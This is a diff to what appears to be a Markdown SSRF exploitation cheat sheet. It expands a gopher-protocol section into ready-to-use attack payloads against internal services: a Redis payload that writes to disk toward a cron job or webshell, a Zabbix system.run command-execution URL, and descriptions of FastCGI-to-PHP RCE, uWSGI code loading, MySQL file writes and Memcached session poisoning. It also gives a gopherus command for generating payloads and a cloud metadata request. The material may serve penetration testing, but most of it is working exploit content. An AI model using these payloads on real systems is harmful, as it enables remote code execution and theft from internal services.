@@ -545,10 +545,27 @@ graph TD
     curl -s "https://target.com/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
    ```
 
-3. **Gopher Protocol Exploitation** (Redis example):
+3. **Gopher Protocol Exploitation**:
 
-   ```
-   gopher://127.0.0.1:6379/_SET%20ssrfkey%20%22Hello%20SSRF%22%0D%0ACONFIG%20SET%20dir%20%2Ftmp%2F%0D%0ACONFIG%20SET%20dbfilename%20redis.dump%0D%0ASAVE%0D%0AQUIT
+   `gopher://` lets you write arbitrary bytes to any TCP service, so it turns SSRF into a generic protocol-smuggling primitive against unauthenticated back-ends — not just Redis. CRLFs and the payload body must be URL-encoded (`%0D%0A` per line).
+
+   - **Redis** (write a key / persist an RDB to disk for cron or webshell):
+     ```
+     gopher://127.0.0.1:6379/_SET%20ssrfkey%20%22Hello%20SSRF%22%0D%0ACONFIG%20SET%20dir%20%2Ftmp%2F%0D%0ACONFIG%20SET%20dbfilename%20redis.dump%0D%0ASAVE%0D%0AQUIT
+     ```
+   - **FastCGI -> PHP RCE**: smuggle a FastCGI record to `php-fpm` (default `127.0.0.1:9000`), setting `PHP_VALUE` to `auto_prepend_file` a payload and executing an arbitrary `SCRIPT_FILENAME` — full RCE on the PHP worker.
+   - **uWSGI**: send a uwsgi packet to the app socket (often `127.0.0.1:8000`/unix socket) injecting `UWSGI_FILE` or env vars to load attacker code.
+   - **Zabbix agent** (`system.run`, port 10050) — run a command on the agent host:
+     ```
+     gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
+     ```
+   - **MySQL**: speak the unauthenticated handshake/login to `127.0.0.1:3306` and issue queries (e.g., `SELECT ... INTO OUTFILE` for file write) when the bound account needs no password.
+   - **Memcached**: unauth `set`/`get` against `127.0.0.1:11211` to poison cache entries or stored sessions.
+
+   Generate these byte-exact payloads with **gopherus** rather than crafting CRLFs by hand:
+
+   ```bash
+   gopherus.py --exploit fastcgi      # also: mysql, redis, pymemcache, smtp, zabbix
    ```
 
 4. **File Access**:
